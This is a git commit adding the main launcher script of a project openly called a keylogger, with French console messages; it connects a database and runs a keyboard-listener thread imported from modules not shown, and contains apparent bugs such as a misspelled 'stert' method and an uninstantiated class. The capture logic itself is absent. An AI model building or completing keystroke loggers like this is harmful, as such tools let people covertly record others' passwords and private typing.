77f11eaee4e68b4af5066c25436a9018bd0bbc0c
lionel5678 <guillaule.castant@gmail.com>
2026-03-19 21:58:58 +0100

    add main

---
+++ main.py
@@ -0,0 +1,39 @@
+import threading
+import time
+import sys
+
+from logger import con
+from listener import KeyLogger
+
+# ── DÉMARRAGE ────────────────────────────────────────────────
+
+def main():
+    print("=" * 40)
+    print(" Keylogger-démarage")
+    print("=" * 40)
+
+
+    con()
+    print("[*] base de donné ready")
+
+    kl = KeyLogger
+    listener_thread = threading.Thread(target=kl.stert)
+    listener_thread.daemon = True
+
+    listener_thread.start()
+    print("[*] listener clavier démarré")
+
+    print("[*] Tout est en marche — Ctrl+C pour arrêter\n")
+
+    try:
+        while True:
+            time.sleep(1)
+            
+    except KeyboardInterrupt:
+        print("\n[*] Ctrl+C détecté — arrêt en cours...")
+        kl.stop()
+        print("[*] Arrêté proprement. À bientôt.")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
